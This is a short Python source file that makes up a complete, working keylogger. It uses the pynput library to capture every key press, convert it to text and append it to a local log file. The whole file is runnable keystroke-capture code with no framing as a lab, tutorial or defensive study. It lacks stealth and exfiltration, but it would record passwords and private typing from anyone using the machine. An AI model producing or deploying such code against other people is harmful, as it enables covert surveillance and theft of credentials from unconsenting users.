from pynput import keyboard

# File to save the logs
LOG_FILE = "key_log.txt"

def write_to_file(key):
    """Write the key pressed to the log file."""
    try:
        with open(LOG_FILE, "a") as file:
            key = str(key).replace("'", "")  # Remove single quotes
            if key == "Key.space":
                file.write(" ")
            elif key == "Key.enter":
                file.write("\n")
            elif key.startswith("Key."):
                # Ignore other special keys like shift, ctrl, etc.
                pass
            else:
                file.write(key)
    except Exception as e:
        print(f"Error writing to log file: {e}")

def on_press(key):
    """Callback for key press events."""
    write_to_file(key)

def main():
    """Start the keylogger."""
    print("Keylogger is running... Press Ctrl+C to stop.")
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    main()
